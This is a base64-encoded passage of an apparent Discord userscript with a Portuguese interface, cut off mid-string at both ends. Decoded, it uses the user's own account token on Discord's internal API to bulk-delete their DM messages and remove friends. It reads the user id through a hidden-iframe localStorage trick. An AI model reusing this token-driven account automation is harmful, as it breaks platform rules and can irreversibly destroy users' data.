clByb3BlcnRpZXMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyByZWNpcGllbnRzOiBbdXNlcklkXSB9KSwKICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcKICAgICAgICB9KTsKICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgICAgIHJldHVybiBkYXRhLmlkOwogICAgfTsKCiAgICBjb25zdCBmZXRjaE1lc3NhZ2VzID0gYXN5bmMgKGNoYW5uZWxJZCwgYmVmb3JlID0gbnVsbCkgPT4gewogICAgICAgIGxldCB1cmwgPSBgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvY2hhbm5lbHMvJHtjaGFubmVsSWR9L21lc3NhZ2VzP2xpbWl0PTEwMGA7CiAgICAgICAgaWYgKGJlZm9yZSkgdXJsICs9IGAmYmVmb3JlPSR7YmVmb3JlfWA7CgogICAgICAgIHdoaWxlICh0cnVlKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKHVybCwgewogICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICAgICAgICAgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBlclByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uub2spIHJldHVybiBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwMDApKTsKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwMDApKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH07CgogICAgY29uc3QgZGVsZXRlTWVzc2FnZSA9IGFzeW5jIChjaGFubmVsSWQsIG1lc3NhZ2VJZCkgPT4gewogICAgICAgIGxldCBlcnJvckNvdW50ID0gMDsKICAgICAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgKICAgICAgICAgICAgICAgICAgICBgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvY2hhbm5lbHMvJHtjaGFubmVsSWR9L21lc3NhZ2VzLyR7bWVzc2FnZUlkfWAsCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdERUxFVEUnLAogICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRva2VuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBlclByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLm9rKSByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5zdGF0dXMgPT09IDUwMDIxKSByZXR1cm4gZmFsc2U7CgogICAgICAgICAgICAgICAgZXJyb3JDb3VudCsrOwogICAgICAgICAgICAgICAgaWYgKGVycm9yQ291bnQgPj0gMykgcmV0dXJuIGZhbHNlOwoKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDAwMCkpOwogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgIGVycm9yQ291bnQrKzsKICAgICAgICAgICAgICAgIGlmIChlcnJvckNvdW50ID49IDMpIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDAwMCkpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfTsKCiAgICBjb25zdCBnZXRDdXJyZW50VXNlcklkID0gKCkgPT4gewogICAgICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgICAgIGlmcmFtZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgICAgICBjb25zdCBpZCA9IGlmcmFtZS5jb250ZW50V2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCd1c2VyX2lkX2NhY2hlJyk7CiAgICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwogICAgICAgIHJldHVybiBpZCA/IGlkLnJlcGxhY2UoLyIvZywgJycpIDogbnVsbDsKICAgIH07CgogICAgY29uc3QgZGVsZXRlQWxsTWVzc2FnZXMgPSBhc3luYyAodXNlcklkLCB1c2VyTmFtZSkgPT4gewogICAgICAgIHNob3dDb25maXJtTW9kYWwoCiAgICAgICAgICAgIGBUZW0gY2VydGV6YSBxdWUgZGVzZWphIGFwYWdhciBUT0RBUyBhcyBzdWFzIG1lbnNhZ2VucyBjb20gJHt1c2VyTmFtZX0/PGJyPjxicj5Fc3NhIGHDp8OjbyBuw6NvIHBvZGUgc2VyIGRlc2ZlaXRhIWAsCiAgICAgICAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgICAgICAgIHByb2dyZXNzTW9kYWwuY2xhc3NOYW1lID0gJ2RmbS1tb2RhbCc7CiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+QXBhZ2FuZG8gTWVuc2FnZW5zPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLXRleHQiIGlkPSJwcm9ncmVzcy10ZXh0Ij5Fc2NhbmVhbmRvIG1lbnNhZ2Vucy4uLjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1iYXIiIGlkPSJwcm9ncmVzcy1iYXIiPjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgYDsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NUZXh0ID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtdGV4dCcpOwogICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy1iYXInKTsKCiAgICAgICAgICAgICAgICBjb25zdCBjdXJyZW50VXNlcklkID0gZ2V0Q3VycmVudFVzZXJJZCgpOwogICAgICAgICAgICAgICAgY29uc3QgY2hhbm5lbElkID0gYXdhaXQgZ2V0Q2hhbm5lbElkKHVzZXJJZCk7CiAgICAgICAgICAgICAgICBjb25zdCBtZXNzYWdlSWRzID0gW107CiAgICAgICAgICAgICAgICBsZXQgbGFzdE1lc3NhZ2VJZCA9IG51bGw7CgogICAgICAgICAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBtZXNzYWdlcyA9IGF3YWl0IGZldGNoTWVzc2FnZXMoY2hhbm5lbElkLCBsYXN0TWVzc2FnZUlkKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIW1lc3NhZ2VzLmxlbmd0aCkgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgIGZvciAoY29uc3QgbXNnIG9mIG1lc3NhZ2VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtc2cuYXV0aG9yLmlkID09PSBjdXJyZW50VXNlcklkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlSWRzLnB1c2gobXNnLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBsYXN0TWVzc2FnZUlkID0gbXNnLmlkOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYCR7bWVzc2FnZUlkcy5sZW5ndGh9IG1lbnNhZ2VucyBlbmNvbnRyYWRhcy4uLmA7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCFtZXNzYWdlSWRzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIHByb2dyZXNzTW9kYWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignTmVuaHVtYSBtZW5zYWdlbSBlbmNvbnRyYWRhJywgJ2luZm8nKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgbGV0IGRlbGV0ZWRDb3VudCA9IDA7CiAgICAgICAgICAgICAgICBsZXQgYmF0Y2hTdGFydCA9IDA7CgogICAgICAgICAgICAgICAgd2hpbGUgKGJhdGNoU3RhcnQgPCBtZXNzYWdlSWRzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGJhdGNoRW5kID0gTWF0aC5taW4oYmF0Y2hTdGFydCArIDIwMDAsIG1lc3NhZ2VJZHMubGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCBiYXRjaCA9IG1lc3NhZ2VJZHMuc2xpY2UoYmF0Y2hTdGFydCwgYmF0Y2hFbmQpOwoKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGJhdGNoLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhd2FpdCBkZWxldGVNZXNzYWdlKGNoYW5uZWxJZCwgYmF0Y2hbaV0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVkQ291bnQrKzsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCB0b3RhbFByb2Nlc3NlZCA9IGJhdGNoU3RhcnQgKyBpICsgMTsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGVyY2VudCA9ICh0b3RhbFByb2Nlc3NlZCAvIG1lc3NhZ2VJZHMubGVuZ3RoKSAqIDEwMDsKICAgICAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYEFwYWdhbmRvICR7ZGVsZXRlZENvdW50fS8ke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnNgOwogICAgICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IGAke3BlcmNlbnR9JWA7CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGJhdGNoU3RhcnQgPSBiYXRjaEVuZDsKICAgICAgICAgICAgICAgICAgICBpZiAoYmF0Y2hFbmQgPCBtZXNzYWdlSWRzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgMjAwMCkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgJHtkZWxldGVkQ291bnR9IG1lbnNhZ2VucyBhcGFnYWRhcyBjb20gc3VjZXNzbyFgLCAnc3VjY2VzcycpOwogICAgICAgICAgICB9CiAgICAgICAgKTsKICAgIH07CgogICAgY29uc3Qgc2hvd0NvbmZpcm1Nb2RhbCA9IChtZXNzYWdlLCBvbkNvbmZpcm0pID0+IHsKICAgICAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgIG1vZGFsLmNsYXNzTmFtZSA9ICdkZm0tbW9kYWwnOwogICAgICAgIG1vZGFsLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRpdGxlIj5Db25maXJtYcOnw6NvPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtdGV4dCI+JHttZXNzYWdlfTwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gc2Vjb25kYXJ5IiBpZD0iY2FuY2VsIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gZGFuZ2VyIiBpZD0iY29uZmlybSI+Q29uZmlybWFyPC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgYDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG1vZGFsKTsKCiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcignI2NhbmNlbCcpLm9uY2xpY2sgPSAoKSA9PiBtb2RhbC5yZW1vdmUoKTsKICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCcjY29uZmlybScpLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgIG1vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICBvbkNvbmZpcm0oKTsKICAgICAgICB9OwogICAgfTsKCiAgICBjb25zdCBmaWx0ZXJJdGVtcyA9IChpdGVtcywgc2VhcmNoVGVybSkgPT4gewogICAgICAgIGlmICghc2VhcmNoVGVybSkgcmV0dXJuIGl0ZW1zOwogICAgICAgIHJldHVybiBpdGVtcy5maWx0ZXIoaXRlbSA9PiBpdGVtLm5hbWUudG9Mb3dlckNhc2UoKS5pbmNsdWRlcyhzZWFyY2hUZXJtLnRvTG93ZXJDYXNlKCkpKTsKICAgIH07CgogICAgY29uc3QgcmVuZGVyRnJpZW5kcyA9IChmcmllbmRzLCBzZWFyY2hUZXJtID0gJycpID0+IHsKICAgICAgICBjb25zdCBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZyaWVuZHMtdGFiJyk7CiAgICAgICAgY29uc3QgZmlsdGVyZWRGcmllbmRzID0gZmlsdGVySXRlbXMoCiAgICAgICAgICAgIGZyaWVuZHMubWFwKGYgPT4gKHsgLi4uZiwgbmFtZTogZi51c2VyLmdsb2JhbF9uYW1lIHx8IGYudXNlci51c2VybmFtZSB9KSksCiAgICAgICAgICAgIHNlYXJjaFRlcm0KICAgICAgICApOwoKICAgICAgICBpZiAoIWZpbHRlcmVkRnJpZW5kcy5sZW5ndGgpIHsKICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VhcmNoLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0iZnJpZW5kcy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgYW1pZ29zLi4uIiB2YWx1ZT0iJHtzZWFyY2hUZXJtfSI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+JHtzZWFyY2hUZXJtID8gJ05lbmh1bSBhbWlnbyBlbmNvbnRyYWRvIHBhcmEgZXN0YSBidXNjYScgOiAnTmVuaHVtIGFtaWdvIGVuY29udHJhZG8nfTwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgICAgICBpZiAoc2VhcmNoVGVybSkgewogICAgICAgICAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yKCcjZnJpZW5kcy1zZWFyY2gnKS5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIChlKSA9PiByZW5kZXJGcmllbmRzKGZyaWVuZHMsIGUudGFyZ2V0LnZhbHVlKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiIgdmFsdWU9IiR7c2VhcmNoVGVybX0iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBzZWNvbmRhcnkiIGlkPSJyZWZyZXNoLWZyaWVuZHMiPkF0dWFsaXphciBMaXN0YTwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9InJlbW92ZS1zZWxlY3RlZC1mcmllbmRzIj5SZW1vdmVyIFNlbGVjaW9uYWRvczwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBkYW5nZXIiIGlkPSJyZW1vdmUtYWxsLWZyaWVuZHMiPlJlbW92ZXIgVG9kb3M8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICR7ZmlsdGVyZWRGcmllbmRzLm1hcChmID0+IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1mcmllbmQiIGRhdGEtaWQ9IiR7Zi5pZH0iIGRhdGEtbmFtZT0iJHtmLnVzZXIuZ2xvYmFsX25hbWUgfHwgZi51c2VyLnVzZXJuYW1lfSIgZGF0YS1hdmF0YXI9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iZGZtLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJkZm0tYXZhdGFyIiBzcmM9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyIgb25lcnJvcj0idGhpcy5zcmM9J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmcnIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5mbyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1uYW1lIj4ke2YudXNlci5nbG9iYWxfbmFtZSB8fCBmLnVzZXIudXNlcm5hbWV9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWZyaWVuZC1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWRlbGV0ZS1tZXNzYWdlcyI+QXBhZ2FyIE1lbnNhZ2VuczwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tcmVtb3ZlIj5SZW1vdmVyPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgYCkuam9pbignJyl9CiAgICAgICAgYDsKCiAgICAgICAgY29uc3Qgc2VhcmNoSW5wdXQgPSBjb250ZW50LnF1ZXJ5U2VsZWN0b3IoJyNmcmllbmRzLXNlYXJjaCcpOwogICAgICAgIGxldCBzZWFyY2hUaW1lb3V0OwogICAgICAgIHNlYXJjaElucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2lucHV0JywgKGUpID0+IHsKICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNlYXJjaFRpbWVvdXQpOwogICAgICAgICAgICBzZWFyY2hUaW1lb3V0ID0gc2V0VGltZW91dCgoKSA9PiByZW5kZXJGcmllbmRzKGZyaWVuZHMsIGUudGFyZ2V0LnZhbHVlKSwgMzAwKTsKICAgICAgICB9KTsKICAgICAgICBzZWFyY2hJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlwcmVzcycsIChlKSA9PiB7CiAgICAgICAgICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgewogICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNlYXJjaFRpbWVvdXQpOwogICAgICAgICAgICAgICAgcmVuZGVyRnJpZW5kcyhmcmllbmRzLCBlLnRhcmdldC52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLWNoZWNrYm94JykuZm9yRWFjaChjaGVja2JveCA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIChlKSA9PiB7CiAgICAgICAgICAgICAgICBlLnRhcmdldC5jbG9zZXN0KCcuZGZtLWZyaWVuZCcpLmNsYXNzTGlzdC50b2dnbGUoJ3NlbGVjdGVkJywgZS50YXJnZXQuY2hlY2tlZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tZGVsZXRlLW1lc3NhZ2VzJykuZm9yRWFjaChidG4gPT4gewogICAgICAgICAgICBidG4ub25jbGljayA9IGUgPT4gewogICAgICAgICAgICAgICAgY29uc3QgZWwgPSBlLnRhcmdldC5jbG9zZXN0KCcuZGZtLWZyaWVuZCcpOwogICAgICAgICAgICAgICAgZGVsZXRlQWxsTWVzc2FnZXMoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lKTsKICAgICAgICAgICAgfTsKICAgICAgICB9KTsKCiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLXJlbW92ZScpLmZvckVhY2goYnRuID0+IHsKICAgICAgICAgICAgYnRuLm9uY2xpY2sgPSBhc3luYyBlID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gZS50YXJnZXQuY2xvc2VzdCgnLmRmbS1mcmllbmQnKTsKICAgICAgICAgICAgICAgIGNvbnN0IGJ1dHRvbiA9IGUudGFyZ2V0OwogICAgICAgICAgICAgICAgYnV0dG9uLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGJ1dHRvbi50ZXh0Q29udGVudCA9ICdSZW1vdmVuZG8uLi4nOwogICAgICAgICAgICAgICAgYXdhaXQgcmVtb3ZlRnJpZW5kKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5hdmF0YXIpOwogICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgfSk7CgogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWZyZXNoLWZyaWVuZHMnKS5vbmNsaWNrID0gYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVmcmVzaC1mcmllbmRzJyk7CiAgICAgICAgICAgIGJ0bi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudCA9ICdBdHVhbGl6YW5kby4uLic7CiAgICAgICAgICAgIGNvbnN0IGZyaWVuZHNEYXRhID0gYXdhaXQgZmV0Y2hGcmllbmRzKCk7CiAgICAgICAgICAgIHJlbmRlckZyaWVuZHMoZnJpZW5kc0RhdGEuZmlsdGVyKGYgPT4gZi50eXBlID09PSAxKSwgc2VhcmNoSW5wdXQudmFsdWUpOwogICAgICAgICAgICBidG4uZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgYnRuLnRleHRDb250ZW50ID0gJ0F0dWFsaXphciBMaXN0YSc7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ0xpc3RhIGF0dWFsaXphZGEgY29tIHN1Y2Vzc28hJywgJ3N1Y2Nlc3MnKTsKICAgICAgICB9OwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVtb3ZlLXNlbGVjdGVkLWZyaWVuZHMnKS5vbmNsaWNrID0gYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBzZWxlY3RlZCA9IEFycmF5LmZyb20oY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLWZyaWVuZC5zZWxlY3RlZCcpKTsKICAgICAgICAgICAgaWYgKCFzZWxlY3RlZC5sZW5ndGgpIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ1NlbGVjaW9uZSBwZWxvIG1lbm9zIHVtIGFtaWdvIScsICd3YXJuaW5nJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHNob3dDb25maXJtTW9kYWwoCiAgICAgICAgICAgICAgICBgVGVtIGNlcnRlemEgcXVlIGRlc2VqYSByZW1vdmVyICR7c2VsZWN0ZWQubGVuZ3RofSBhbWlnbyhzKT9gLAogICAgICAgICAgICAgICAgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBjcmVhdGVQcm9ncmVzc01vZGFsKCdSZW1vdmVuZG8gQW1pZ29zJywgc2VsZWN0ZWQubGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHByb2dyZXNzTW9kYWwpOwoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy10ZXh0Jyk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy1iYXInKTsKCiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzZWxlY3RlZC5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBlbCA9IHNlbGVjdGVkW2ldOwogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCByZW1vdmVGcmllbmQoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0LmF2YXRhcik7CiAgICAgICAgICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIHNlbGVjdGVkLmxlbmd0aCwgJ2FtaWdvcycpOwogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWV